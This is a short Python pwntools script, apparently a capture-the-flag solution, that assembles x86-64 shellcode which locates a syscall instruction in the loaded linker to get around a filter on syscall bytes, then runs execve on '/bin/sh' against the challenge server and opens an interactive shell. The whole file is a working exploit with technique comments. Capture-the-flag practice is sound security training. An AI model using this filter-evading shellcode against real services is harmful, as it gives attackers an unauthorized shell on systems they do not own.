from pwn import *

context.arch = "amd64"
shellcode = """
lea r8, [rip]
sub r8, 0x37                        # base of ld section
add r8, 0x4000                      # ld server --> 0x4000 ld local ---> 0x2000
mov ebx, 0x464c457f                 # loading the value "\x7fELF" into ebx
cmp ebx, dword ptr[r8]              # for finding the elf header
je search

search:
    mov rbx, 0x0510                 # loading the bytes of syscall.To avoid 0xf we have loaded it as 0x10 and then subtracted it by 1
    sub bl, 1
    add r8, 0x1000
    cmp bx, [r8]
    je found
    inc r8
    jmp search+17

found:
    mov al, 0x3b                    # triggering execve syscall
    lea rdi, [rip+shell]
    jmp r8
shell:
    .ascii "/bin/sh"                # pushing "/bin/sh" along with the shellcode
"""
shellcode =  asm(shellcode)
r = remote("dont-syscall-me.chal.imaginaryctf.org" ,1337)
#r = process("./vuln")
r.sendafter('Send your code:',shellcode)
r.interactive()
